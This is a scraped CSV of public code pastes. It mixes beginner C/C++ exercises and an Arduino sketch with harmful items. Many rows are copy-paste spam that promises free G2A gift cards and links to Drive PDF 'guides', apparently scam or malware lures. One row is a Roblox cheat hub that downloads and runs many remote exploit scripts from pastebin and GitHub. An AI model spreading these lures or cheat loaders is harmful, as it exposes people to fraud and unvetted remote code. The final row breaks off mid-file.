id,title,username,language,date,content
V6K3AL2y,ü§ëG2A.com Free Gift Card FIX July 2024ü§ë,7AcxeMC,JavaScript,Saturday 6th of July 2024 07:04:41 AM CDT,"G2A.com free gift card & games guide.
Any item for free on G2A.com including Xbox gift cards & all else offered.
This is the most latest version of this script.

PDF guide here:
https://drive.google.com/file/d/1kcJ-yXUpB1u8mkFHUQKnrArP6DGl5W8e/view?01842

Working as of:
July 5 2024

"
uuYy6aCE,ü§ëG2A.com Free Gift Card FIX July 2024ü§ë,tvprekointerneta00,JavaScript,Saturday 6th of July 2024 06:58:37 AM CDT,"G2A.com complimentary voucher & games guide.
Any gift card for free on G2A.com including Xbox gift cards & anything else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/1kcJ-yXUpB1u8mkFHUQKnrArP6DGl5W8e/view?01842

Working as of:
July 5 2024

"
HbWzbErL,ü§ëG2A.com Free Gift Card FIX July 2024ü§ë,speed_car,JavaScript,Saturday 6th of July 2024 06:52:34 AM CDT,"G2A.com complimentary gift card & games guide.
Any gift card for free on G2A.com including Playstation gift cards & all else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/1kcJ-yXUpB1u8mkFHUQKnrArP6DGl5W8e/view?01842

Working as of:
5th of July 2024

"
3SmcQmW6,üéÅ G2A.COM FREE GIFT CARD GUIDE JUL 2024 V2 üéÅ,jusst2k4,GetText,Saturday 6th of July 2024 06:47:28 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_929993.pdf
 
Working as of:
06 July 2024"
8A4kXsi1,ü§ëG2A.com Free Gift Card FIX July 2024ü§ë,Axel_Jax,JavaScript,Saturday 6th of July 2024 06:46:30 AM CDT,"G2A.com free gift card & games guide.
Any item for free on G2A.com including Amazon gift cards & anything else offered.
This is the most current version of this script.

PDF guide here:
https://drive.google.com/file/d/1kcJ-yXUpB1u8mkFHUQKnrArP6DGl5W8e/view?01842

Working as of:
July 5 2024

"
ue4ydZih,Untitled,dllbridge,C,Saturday 6th of July 2024 06:45:35 AM CDT,"
#include<stdio.h>


int summa(int a, int b);

///////////////////////////////////////////////
int main()
{
   int a, b, c;
  
   scanf(""%d%d%d"", &a, &b, &c);
   
   switch(c)
   {
		
        case 1: c = summa(a, b);
                printf(""%d + %d = %d\n"", a, b, a+b, c);
                break;
       
        case 2: c=a-b;
                printf(""%d - %d = %d\n"", a, b, c);
                break;
       
        case 3: c=a*b;
                printf(""%d * %d = %d\n"", a, b, c);
                break;  
   }

}

/////////////////////////////////////////////
int summa(int a, int b)
{
	
return a + b;	
}


  // printf(""%d\n"",a);
 //  printf(""%d\n"",b);


/*   #include<stdio.h>

/////////////////////////////////
struct   Big
{
    int length;
    int  width;
};


////////////////////////////////////////////
int main()
{
    Big a, b;

    a.length = 12;
    
    printf(""        a.length = %d\n"", a.length);
    printf(""address a.length = %d\n"", &a.length);
    printf(""address a. width = %d\n"", &a.width);
}*/





/*


#include<stdio.h>

/////////////////////////////////
struct   Big
{
    int   length;
    int    width;
    double   max;
    float    min;
};

void foo(Big *p );
void f_2(Big *pb);

////////////////////////////////////////////////
 int main()
{
     Big b;

     printf("" adress lenght = %d\n"", &b.length);
     printf("" adress width  = %d\n"", &b. width);
     printf("" adress max    = %d\n"", &b.   max);
     printf("" adress min    = %d\n"", &b.   min);
     
     foo(&b);
     f_2(&b);     
}



////////////////////////////////////////////////
void f_2(Big *pb)
{
	
     printf("" adress lenght = %d\n"", &pb->length);
     printf("" adress width  = %d\n"", &pb-> width);
     printf("" adress max    = %d\n"", &pb->   max);
     printf("" adress min    = %d\n"", &pb->   min);	
}
	


////////////////////////////////////////////////
void foo(Big *pb)
{
	
	 char *p = (char*)pb;
	 
	 printf("" p     = %d\n"", p);         p  = p + 4;
	 printf("" p + 4 = %d\n"", p);         p  = p + 4; 
	 printf("" p + 4 = %d\n"", p);         p +=     8;
	 printf("" p + 8 = %d\n"", p); 	 
}

*/





/*


#include<stdio.h>

/////////////////////////////////
struct   Big
{
    int   length;
    int    width;
    double   max;
    float    min;
};

////////////////////////////////////////////////
 int main()
{
     Big b;

     printf("" adress lenght = %d\n"", &b.length);
     printf("" adress width  = %d\n"", &b. width);
     printf("" adress max    = %d\n"", &b.   max);
     printf("" adress min    = %d\n"", &b.   min);
}


*/"
D382TGzw,ü§ëG2A.com Free Gift Card FIX July 2024ü§ë,FunkyMonkey22,JavaScript,Saturday 6th of July 2024 06:40:15 AM CDT,"G2A.com complimentary voucher & games guide.
Any voucher for free on G2A.com including Playstation gift cards & anything else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/1kcJ-yXUpB1u8mkFHUQKnrArP6DGl5W8e/view?01842

Working as of:
July 5 2024

"
26Zjjvw4,ü§ëG2A.com Free Gift Card FIX July 2024ü§ë,Darkew,JavaScript,Saturday 6th of July 2024 06:33:59 AM CDT,"G2A.com free gift card & gaming guide.
Any gift card for free on G2A.com including Xbox gift cards & everything else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/1kcJ-yXUpB1u8mkFHUQKnrArP6DGl5W8e/view?01842

Working as of:
July 5 2024

"
JmeNchsN,ü§ëG2A.com Free Gift Card FIX July 2024üéÅ,angeloee,JavaScript,Saturday 6th of July 2024 06:27:57 AM CDT,"G2A.com complimentary voucher & gaming guide.
Any item for free on G2A.com including Steam gift cards & anything else offered.
This is the most latest version of this script.

PDF guide here:
https://drive.google.com/file/d/1kcJ-yXUpB1u8mkFHUQKnrArP6DGl5W8e/view?01842

Working as of:
July 5 2024

"
iALkRdFJ,Plasma Hub,Gaming_Bear,Lua,Saturday 6th of July 2024 06:23:09 AM CDT,"local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local Window = Rayfield:CreateWindow({
   Name = ""Plasma Hub"",
   LoadingTitle = ""Loading"",
    LoadingSubtitle = ""Made by PlasmaV using Rayfield"",
   ConfigurationSaving = {
      Enabled = true,
      FolderName = nil, -- Create a custom folder for your hub/game
      FileName = ""PlasmaV Universal""
   },
   Discord = {
      Enabled = true,
      Invite = ""pfyWEm4uyS"", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ABCD would be ABCD
      RememberJoins = true -- Set this to false to make them join the discord every time they load it up
   },
   KeySystem = false, -- Set this to true to use our key system
   KeySettings = {
      Title = ""PlasmaV Hub Key System"",
      Subtitle = ""Join our discord to gain access to the key!"",
      Note = ""https://discord.gg/pfyWEm4uyS"",
      FileName = ""Key"", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
      SaveKey = true, -- The user's key will be saved, but if you change the key, they will be unable to use your script
      GrabKeyFromSite = true, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
      Key = {""https://pastebin.com/raw/BSheLKnk""} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings (""hello"",""key22"")
   }
})

Rayfield:Notify({
   Title = ""Plasma Hub Executed successfully"",
   Content = ""Remember to always use an alt while exploiting, stay safe!"",
   Duration = 6.5,
   Image = 4483362458,
   Actions = { -- Notification Buttons
      Ignore = {
         Name = ""Cool"",
         Callback = function()
         print(""The user tapped Okay!"")
      end
   },
},
})

-- MAIN TAB
 
local MainTab = Window:CreateTab(""Main"", 4483362458) -- Title, Image
local MainSection = MainTab:CreateSection(""Main"")

local Label = MainTab:CreateLabel(""V1"")
local Label = MainTab:CreateLabel(""This script is in progress and many features are planned to be added - Plasma Team."")

-- UNIVERSAL TAB

local UniTab = Window:CreateTab(""Universal"", 4483362458) -- Title, Image
local UniSection = UniTab:CreateSection(""Local Player"")

local Slider = UniTab:CreateSlider({
   Name = ""WalkSpeed Slider"",
   Range = {1, 500},
   Increment = 1,
   Suffix = ""Speed"",
   CurrentValue = 16,
   Flag = ""sliderws"", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(Value)
        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = (Value)
   end,
})

local Slider = UniTab:CreateSlider({
   Name = ""JumpPower Slider"",
   Range = {1, 350},
   Increment = 1,
   Suffix = ""Hight"",
   CurrentValue = 50,
   Flag = ""sliderjp"", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(Value)
        game.Players.LocalPlayer.Character.Humanoid.JumpPower = (Value)
   end,
})

-- UNIVERSAL SCRIPTS

local UniSection = UniTab:CreateSection(""Universal Scripts"")

local Button = UniTab:CreateButton({
   Name = ""Infinite Yield"",
   Callback = function()
   loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))() -- The function that takes place when the button is pressed
   end,
})

local Button = UniTab:CreateButton({
   Name = ""DomainX (Custom Version soon)"",
   Callback = function()
   loadstring(game:HttpGet('https://pastebin.com/raw/YqD1TpgD'))() -- The function that takes place when the button is pressed
   end,
})

local Button = UniTab:CreateButton({
   Name = ""Unnamed ESP"",
   Callback = function()
            pcall(function() loadstring(game:HttpGet('https://raw.githubusercontent.com/ic3w0lf22/Unnamed-ESP/master/UnnamedESP.lua'))() end)
   end,
})


local Button = UniTab:CreateButton({
   Name = ""Click TP"",
   Callback = function()
   loadstring(game:HttpGet('https://pastebin.com/raw/vdLumqAq'))()
   end,
})

local Button = UniTab:CreateButton({
   Name = ""Btools"",
   Callback = function()
   loadstring(game:HttpGet('https://pastebin.com/raw/syqWRnHC'))()
   end,
})

local Button = UniTab:CreateButton({
   Name = ""Fullbright"",
   Callback = function()
   loadstring(game:HttpGet('https://pastebin.com/raw/tePZ6ke3'))()
   end,
})

local Button = UniTab:CreateButton({
   Name = ""Inf Jump (V to toggle)"",
   Callback = function()
   loadstring(game:HttpGet('https://pastebin.com/raw/vp25QVYP'))()
   end,
})


    -- Script Hub
local ScriptTab = Window:CreateTab(""Script Hub"", 4483362458) -- Title, Image
local ScriptSection = ScriptTab:CreateSection(""Games"")

local Button = ScriptTab:CreateButton({
   Name = ""Infinite Yield"",
   Callback = function()
   loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))() -- The function that takes place when the button is pressed
   end,
})

local Button = ScriptTab:CreateButton({
   Name = ""Decaying winter Goodwill"",
   Callback = function()
	loadstring(game:HttpGet(('https://pastebin.com/raw/BDUcjRMw'),true))()
   end,
})

local Button = ScriptTab:CreateButton({
   Name = ""Decaying winter CLOSES PLASMA HUB! DO THIS LAST!(key: Limbo Lust all gone.)"",
   Callback = function()
   loadstring(game:HttpGet(('https://raw.githubusercontent.com/sasquatchhtv/SasHub/main/DWScriptFree'),true))()
   end,
})

local Button = ScriptTab:CreateButton({
   Name = ""Hellmet ESP (Moving to Script Hub)"",
   Callback = function()
   loadstring(game:HttpGet('https://raw.githubusercontent.com/Lucasfin000/SpaceHub/main/UESP'))()
   end,
})

local Button = ScriptTab:CreateButton({
   Name = ""Naval Warefare Basic"",
   Callback = function()
   loadstring(game:HttpGet('https://pastebin.com/raw/CYWenD1T'))() -- The function that takes place when the button is pressed
   end,
})

local Button = ScriptTab:CreateButton({
   Name = ""Naval Warefare 2024"",
   Callback = function()
   loadstring(game:HttpGet('https://pastebin.com/raw/vr5DGzEX'))() -- The function that takes place when the button is pressed
   end,
})

local Button = ScriptTab:CreateButton({
   Name = ""Arsenal"",
   Callback = function()
	loadstring(game:HttpGet(""https://pastebin.com/raw/xYwLY6hj""))()
   end,
})

local Button = ScriptTab:CreateButton({
   Name = ""MM2 (NOT WORKING)"",
   Callback = function()
	loadstring(game:HttpGet(('https://pastebin.com/raw/gFqUJyy8'),true))()
   end,
})

-- EXPERIMENTAL TAB

local TestTab = Window:CreateTab(""Test Tab"", 4483362458) -- Title, Image
local TestSection = TestTab:CreateSection(""Features"")

local Toggle = TestTab:CreateToggle({
   Name = ""Toggle Test"",
   CurrentValue = false,
   Flag = ""ToggleTest"", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(Value)
   print(""toggle on"") -- The function that takes place when the toggle is pressed
   end,
})

local Dropdown = TestTab:CreateDropdown({
   Name = ""Dropdown Test"",
   Options = {""Option 1"",""Option 2""},
   CurrentOption = {""Option 1""},
   MultipleOptions = false,
   Flag = ""Dropdowntest"", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(Option)
   -- The function that takes place when the selected option is changed
   -- The variable (Option) is a table of strings for the current selected options
   end,
})

local Button = TestTab:CreateButton({
   Name = ""Infinite Yield"",
   Callback = function()
   loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))() -- The function that takes place when the button is pressed
   end,
})

local Button = TestTab:CreateButton({
   Name = ""Print Test"",
   Callback = function()
   print(""Execution Working"")
   end,
})

local Button = TestTab:CreateButton({
   Name = ""Notify"",
   Callback = function()
  Rayfield:Notify({
   Title = ""Notification Title"",
   Content = ""Notification Content"",
   Duration = 6.5,
   Image = 4483362458,
   Actions = { -- Notification Buttons
      Ignore = {
         Name = ""Okay!"",
         Callback = function()
         print(""The user tapped Okay!"")
      end
   },
},
})
   end,
})

local ColorPicker = TestTab:CreateColorPicker({
    Name = ""Color Picker"",
    Color = Color3.fromRGB(255,255,255),
    Flag = ""ColorPickerTest"", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
    Callback = function(Value)
        -- The function that takes place every time the color picker is moved/changed
        -- The variable (Value) is a Color3fromRGB value based on which color is selected
    end
})

local Input = TestTab:CreateInput({
   Name = ""Input Test"",
   PlaceholderText = ""Input Placeholder"",
   RemoveTextAfterFocusLost = false,
   Callback = function(Text)
   print(""Changed"")-- The function that takes place when the input is changed
   print(""Something"")-- The variable (Text) is a string for the value in the text box
   end,
})"
QXP284zd,ü§ëG2A.com Free Gift Card FIX July 2024ü§ë,jcxeq,JavaScript,Saturday 6th of July 2024 06:21:41 AM CDT,"G2A.com complimentary gift card & games guide.
Any gift card for free on G2A.com including Steam gift cards & anything else offered.
This is the most current version of this script.

PDF guide here:
https://drive.google.com/file/d/1kcJ-yXUpB1u8mkFHUQKnrArP6DGl5W8e/view?01842

Working as of:
July 5 2024

"
xVnJXaXs,ü§ëG2A.com Free Gift Card FIX July 2024ü§ë,PAUL-A8,JavaScript,Saturday 6th of July 2024 06:15:40 AM CDT,"G2A.com free voucher & games guide.
Any item for free on G2A.com including Steam gift cards & all else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/1kcJ-yXUpB1u8mkFHUQKnrArP6DGl5W8e/view?01842

Working as of:
July 5 2024

"
qkJ8pJQy,ü§ëG2A.com Free Gift Card FIX July 2024ü§ë,Kevin_Chen1,JavaScript,Saturday 6th of July 2024 06:09:37 AM CDT,"G2A.com free voucher & gaming guide.
Any voucher for free on G2A.com including Amazon gift cards & everything else offered.
This is the most current version of this script.

PDF guide here:
https://drive.google.com/file/d/1kcJ-yXUpB1u8mkFHUQKnrArP6DGl5W8e/view?01842

Working as of:
July 5 2024

"
qANFQ21G,data979,TestGuy1,JSON,Saturday 6th of July 2024 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '581adc4c56263708f59955584743e41801fece7575563f4dd07acf5e7fd3ee469be3a92e3e022c65f8d9486cf24fa57bb1b6616e9e9f82680528ae051712ca1391061ff83ffe55231556d14f3acb4d295f1ee81e87c20b7a21142075035b433e68ba170ff2ab32cad3e5a209f92acc55a542a2ad05c022b44ad1c3349cdb712a',
  otherdata: [
    'baf11f2a0e8f5b7eb806115d1f318c10',
    '90748b320c7fa041bf84e48497daa578',
    '45f69cd6f948c0b5f524575aed8e26fc',
    '66fdd54fedd99616350106d8923dd502',
    '566cadcd8d1e5f84d137d97b76b4e7f1',
    '325e5a6e8a898eae09885719a42e49a2',
    '579296a359dd627803ed348e3e6309cd',
    '640488da43659f227e4f610986ff8153'
  ]
}"
W16JYSvP,"""Distance Measurement"" rev_01",pleasedontcode,Arduino,Saturday 6th of July 2024 05:34:46 AM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: ""Distance Measurement""
	- Source Code NOT compiled for: Arduino Uno
	- Source Code created on: 2024-07-06 10:33:59

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* Develop an Arduino project using the Ultrasonic */
	/* library to measure distance with the HC-SR04 */
	/* sensor. The Echo pin is connected to D3 and the */
	/* Trigger pin to D2. Implement functions to read */
	/* sensor data and update output variables. */
/****** END SYSTEM REQUIREMENTS *****/

/****** DEFINITION OF LIBRARIES *****/
#include <Ultrasonic.h>  //https://github.com/ErickSimoes/Ultrasonic

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);
void updateOutputs(void);

/***** DEFINITION OF DIGITAL INPUT PINS *****/
const uint8_t HC_SR04_Echo_PIN_D3 = 3;

/***** DEFINITION OF DIGITAL OUTPUT PINS *****/
const uint8_t HC_SR04_Trigger_PIN_D2 = 2;

/***** DEFINITION OF OUTPUT RAW VARIABLES *****/
/***** used to store raw data *****/
bool HC_SR04_Trigger_PIN_D2_rawData = 0;

/***** DEFINITION OF OUTPUT PHYSICAL VARIABLES *****/
/***** used to store data after characteristic curve transformation *****/
float HC_SR04_Trigger_PIN_D2_phyData = 0.0;

/****** DEFINITION OF LIBRARIES CLASS INSTANCES*****/
Ultrasonic ultrasonic(HC_SR04_Trigger_PIN_D2, HC_SR04_Echo_PIN_D3); // Initialize Ultrasonic object

void setup(void)
{
  // put your setup code here, to run once:
  Serial.begin(9600); // Initialize serial communication
  pinMode(HC_SR04_Echo_PIN_D3, INPUT);
  pinMode(HC_SR04_Trigger_PIN_D2, OUTPUT);
}

void loop(void)
{
  // put your main code here, to run repeatedly:
  updateOutputs(); // Refresh output data
  delay(1000); // Delay to avoid flooding the serial monitor
}

void updateOutputs()
{
  HC_SR04_Trigger_PIN_D2_phyData = ultrasonic.read(); // Read distance from ultrasonic sensor
  Serial.print(""Distance in CM: "");
  Serial.println(HC_SR04_Trigger_PIN_D2_phyData); // Print distance to serial monitor
}
"
PXAAkJCk,gtav_aft_cl.lua,MARK2580,Lua,Saturday 6th of July 2024 04:56:10 AM CDT,"if game.GetMap() == ""gm_gtav_clubs"" then
	local thinktime = 0
	local thinkinterval = 0.5
	local colors = {
		""0.8745 0.0862 0.9058"",
		""0.9686 0.3568 0.9764"",
		""1 1 1"",
		""0.4470 0.8862 0.8"",
		""0.7960 0 0"",
		""0.6156 0.6784 0.3921"",
		""0 0.7372 0.8352""    
	}
	matproxy.Add( {
		name = ""RandomColorProoxie"",
		init = function( self, mat, values )
			self.ColorResult = values.resultvar
		end,
		bind = function( self, mat, ent )
			if CurTime() > ( thinktime + thinkinterval ) then
				mat:SetVector( self.ColorResult, Vector( colors[ math.random( #colors ) ] ) )
				thinktime = CurTime() + thinkinterval
			end
		end
	} )
	local path = ""models/mark2580/gtav/electrical/screens/""
	local basematerial = path..""effect_01""
	local materials = {}
	for i = 1, 16 do
		local num = i < 10 and ""0""..i or i
		table.insert(materials,""effect_""..i)
	end
	local function ChangeRandMaterial()
		Material(basematerial):SetTexture(""$basetexture"",path..materials[math.random(1,table.maxn(materials))])
		timer.Simple(math.Rand(1,3),function() ChangeRandMaterial() end)
	end
	ChangeRandMaterial()
end"
fdH2MU3Y,–ê—Å—Ç—Ä–æ–ª–æ–≥–∏—è –Ω–∞ —Å–µ–ª–µ,NickAndNick,C++,Saturday 6th of July 2024 04:49:36 AM CDT,"#include <algorithm>
#include <array>
#include <iomanip>
#include <iostream>
#include <sstream>
#include <string>

using namespace std;

struct ZNAK {
    enum class Zodiac {
        –û–≤–µ–Ω = 1,
        –¢–µ–ª–µ—Ü,
        –ë–ª–∏–∑–Ω–µ—Ü—ã,
        –†–∞–∫,
        –õ–µ–≤,
        –î–µ–≤–∞,
        –í–µ—Å—ã,
        –°–∫–æ—Ä–ø–∏–æ–Ω,
        –°—Ç—Ä–µ–ª–µ—Ü, 
        –ö–æ–∑–µ—Ä–æ–≥,
        –í–æ–¥–æ–ª–µ–π,
        –†—ã–±—ã
    };

    ZNAK() : sign(Zodiac::–û–≤–µ–Ω), date_of_birth{ 0, 0, 0 } {}

    string name;
    Zodiac sign;
    int date_of_birth[3];

    bool in_month(const int month) const {
        return date_of_birth[1] == month;
    }
private:
    template<typename T>
    T input(istream& inp, const string& prompt) {
        cout << prompt;
        T value{};
        inp >> value;
        inp.ignore(0x1000, '\n');
        return value;
    }

    template<>
    string input(istream& inp, const string& prompt) {
        cout << prompt;
        string line;
        getline(inp, line);
        return line;
    }

    inline static const char* signs[]{
        ""–û–≤–µ–Ω"",
        ""–¢–µ–ª–µ—Ü"",
        ""–ë–ª–∏–∑–Ω–µ—Ü—ã"",
        ""–†–∞–∫"",
        ""–õ–µ–≤"",
        ""–î–µ–≤–∞"",
        ""–í–µ—Å—ã"",
        ""–°–∫–æ—Ä–ø–∏–æ–Ω"",
        ""–°—Ç—Ä–µ–ª–µ—Ü"",
        ""–ö–æ–∑–µ—Ä–æ–≥"",
        ""–í–æ–¥–æ–ª–µ–π"",
        ""–†—ã–±—ã""
    };

    string show() const {
        stringstream ss;
        auto n = 0;
        for (const auto& item : signs) {
            ss << setw(2) << ++n << "". "" << item << '\n';
        }
        return ss.str();
    }

    string date_string() const {
        string date;
        if (date_of_birth[0] < 10) date = ""0"";
        date += to_string(date_of_birth[0]) + ""."";
        if (date_of_birth[1] < 10) date += ""0"";
        date += to_string(date_of_birth[1]) + ""."" + to_string(date_of_birth[2]);
        return date;
    }

    friend istream& operator>>(istream& inp, Zodiac& zodiac) {
        int sign;
        inp >> sign;
        switch (sign) {
        case 1: zodiac = Zodiac::–û–≤–µ–Ω; break;
        case 2: zodiac = Zodiac::–¢–µ–ª–µ—Ü; break;
        case 3: zodiac = Zodiac::–ë–ª–∏–∑–Ω–µ—Ü—ã; break;
        case 4: zodiac = Zodiac::–†–∞–∫; break;
        case 5: zodiac = Zodiac::–õ–µ–≤; break;
        case 6: zodiac = Zodiac::–î–µ–≤–∞; break;
        case 7: zodiac = Zodiac::–í–µ—Å—ã; break;
        case 8: zodiac = Zodiac::–°–∫–æ—Ä–ø–∏–æ–Ω; break;
        case 9: zodiac = Zodiac::–°—Ç—Ä–µ–ª–µ—Ü; break;
        case 10: zodiac = Zodiac::–ö–æ–∑–µ—Ä–æ–≥; break;
        case 11: zodiac = Zodiac::–í–æ–¥–æ–ª–µ–π; break;
        case 12: zodiac = Zodiac::–†—ã–±—ã; break;
        }
        return inp;
    }

    friend istream& operator>>(istream& inp, ZNAK& znak) {
        znak.name = znak.input<string>(inp, ""–§–∞–º–∏–ª–∏—è, –∏–º—è: "");
        znak.sign = znak.input<Zodiac>(inp, znak.show() + "">>> "");
        cout << ""–í–≤–µ–¥–∏—Ç–µ –¥–∞—Ç—É —Ä–æ–∂–¥–µ–Ω–∏—è\n"";
        znak.date_of_birth[0] = znak.input<int>(inp, "" - –¥–µ–Ω—å: "");
        znak.date_of_birth[1] = znak.input<int>(inp, "" - –º–µ—Å—è—Ü: "");
        znak.date_of_birth[2] = znak.input<int>(inp, "" - –≥–æ–¥: "");
        return inp;
    }

    friend ostream& operator<<(ostream& out, const ZNAK& znak) {
        out << znak.name << "", "" 
            << znak.date_string() << "", "" 
            << znak.signs[size_t(znak.sign) - 1];
        return out;
    }

    friend bool operator<(const ZNAK& a, const ZNAK& b) {
        if (a.sign < b.sign) return true;
        else if (a.sign == b.sign) {
            return a.date_of_birth[1] < b.date_of_birth[1];
            if (a.date_of_birth[1] == b.date_of_birth[1]) {
                return a.date_of_birth[0] < b.date_of_birth[0];
                if (a.date_of_birth[0] == b.date_of_birth[0]) {
                    return a.date_of_birth[2] < b.date_of_birth[2];
                }
                return a.name < b.name;
            }
        }
        return false;
    }
};

int main() {
    array<ZNAK, 3> table;
    for (auto& record : table) cin >> record;
    sort(table.begin(), table.end());
    for (const auto& record : table) cout << record << '\n';
    cout << ""–í–≤–µ–¥–∏—Ç–µ –º–µ—Å—è—Ü: "";
    int month;
    cin >> month;
    size_t n = 0;
    for (const auto& record : table) {
        if (record.in_month(month)) {
            cout << setw(2) << ++n << "". "" << record << '\n';
        }
    }
    if (!n) puts(""–°–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤–∏—è –Ω–µ –æ–±–Ω–∞—Ä—É–∂–µ–Ω—ã!"");
}"
hSUJm1bk,Untitled,dllbridge,C,Saturday 6th of July 2024 04:37:07 AM CDT,"


#include  <stdio.h>


int foo(int *p);


////////////////////////////////////////////////////
int main()                                        // 
{
        
        
    int nArr[10] = {4, 4, 10, 4, 4, 
                    4, 4, 4, 4, 4};       
	
    int  n = foo(&nArr[2]);
    
    
    
    for(int i = 2; i < 12; i++)
    {
    
        printf(""nArr[%d] = %d \n"", i, nArr[i]); 
    } 
    printf("" - - - - - ""); 
    printf(""Summa = %d \n"",  n); 
    
}




//////////////////////////////////////////////////
int foo(int *p)
{
    int nS = 0;    

    for(int i = 0; i < 10; i++)
    {
            
        nS += p[i];           
    }   
return nS;         
}









/*

#include  <stdio.h>



int nArr[10] = {4, 4, 3, 4, 4, 
                4, 4, 4, 4, 4};

////////////////////////////////////////////////////
int main()                                        // 
{
	
    int  nS = 0;
    
    
    for(int i = 0; i < 10; i++)
    {
            
        nS += nArr[i];       
            
    }
    
    printf(""Summa = %d \n"",  nS); 
    
}



*/
















/*
#include  <stdio.h>





////////////////////////////////////////////////////
int main()                                        // 
{
	
    int  n = 123;
    
    int *p = &n;
    
    printf(""address of n = %d \n"", &n);     
    printf(""           p = %d \n"",  p); 
    printf(""          *p = %d \n"", *p);     
}



*/





"
GSgMqLxu,Untitled,35657,C++,Saturday 6th of July 2024 04:33:11 AM CDT,"
#define _CRT_SECURE_NO_WARNINGS

#include <iostream>

using namespace std;

struct contact {
	char name[40];
	char mobile_phone[20];
	char home_phone[20];
	char work_phone[20];
};

class phone_book {

public:

	phone_book() : contacts_number(0), max_contacts_number(4), store(new contact[4]) {}

	explicit phone_book(int max_number) : contacts_number(0), max_contacts_number(max_number), store(new contact[max_number]) {}

	phone_book(const phone_book& other) : contacts_number(0), max_contacts_number(other.max_contacts_number), store(new contact[other.max_contacts_number]) {
		for (int i = 0; i < other.contacts_number; i++) {
			add_contact(other.store[i].name, other.store[i].mobile_phone, other.store[i].home_phone, other.store[i].work_phone);
		}
	}

	phone_book& operator=(const phone_book& other) {
		if (this != &other) {
			delete[] store;
			contacts_number = 0;
			max_contacts_number = other.max_contacts_number;
			store = new contact[max_contacts_number];
			for (int i = 0; i < other.contacts_number; i++) {
				add_contact(other.store[i].name, other.store[i].mobile_phone, other.store[i].home_phone, other.store[i].work_phone);
			}
		}
		return *this;
	}

	void add_contact(const char* name, const char* mobile_phone, const char* home_phone, const char* work_phone) {
		if (contacts_number == max_contacts_number) {
			contact* temp = new contact[max_contacts_number * 2];
			for (int i = 0; i < contacts_number; i++) {
				temp[i] = store[i];
			}
			delete[] store;
			store = temp;
			max_contacts_number *= 2;
		}
		strcpy(store[contacts_number].name, name);
		strcpy(store[contacts_number].mobile_phone, mobile_phone);
		strcpy(store[contacts_number].home_phone, home_phone);
		strcpy(store[contacts_number].work_phone, work_phone);
		contacts_number++;
	}


	void del_contact(const char* name) {
		for (int i = 0; i < contacts_number; i++) {
			if (!strcmp(store[i].name, name)) {
				for (int j = i; j < contacts_number - 1; j++) {
					store[j] = store[j + 1];
				}
				contacts_number--;
				i--; // –Ω–∞ —Å–ª—É—á–∞–π, –µ—Å–ª–∏ –ø–æ–¥—Ä—è–¥ –∏–¥—É—Ç –¥–≤–∞ –æ–¥–Ω–æ–∏–º–µ–Ω–Ω—ã—Ö –∫–æ–Ω—Ç–∞–∫—Ç–∞ (–∏–Ω–∞—á–µ —á–µ—Ä–µ–∑ –≤—Ç–æ—Ä–æ–π –ø–µ—Ä–µ—Å–∫–∞–∫–∏–≤–∞–µ—Ç)
			}
		}
	}

	void show_all_contacts() const {
		for (int i = 0; i < contacts_number; i++) {
			cout << store[i].name << "", –º–æ–±–∏–ª—å–Ω—ã–π —Ç–µ–ª–µ—Ñ–æ–Ω -  "" << store[i].mobile_phone << "", –¥–æ–º–∞—à–Ω–∏–π —Ç–µ–ª–µ—Ñ–æ–Ω - "" << store[i].home_phone << "", —Ä–∞–±–æ—á–∏–π —Ç–µ–ª–µ—Ñ–æ–Ω - "" << store[i].work_phone << endl;
		}
		cout << endl;
	}

	void find_contact_name(const char* name) const {
		for (int i = 0; i < contacts_number; i++) {
			if (!strcmp(store[i].name, name)) {
				cout << store[i].name << "", –º–æ–±–∏–ª—å–Ω—ã–π —Ç–µ–ª–µ—Ñ–æ–Ω -  "" << store[i].mobile_phone << "", –¥–æ–º–∞—à–Ω–∏–π —Ç–µ–ª–µ—Ñ–æ–Ω - "" << store[i].home_phone << "", —Ä–∞–±–æ—á–∏–π —Ç–µ–ª–µ—Ñ–æ–Ω - "" << store[i].work_phone << endl;
			}
		}
	}

	bool operator==(const phone_book& other) const {
		if (this->contacts_number != other.contacts_number) {
			return false;
		}
		for (int i = 0; i < contacts_number; i++) {
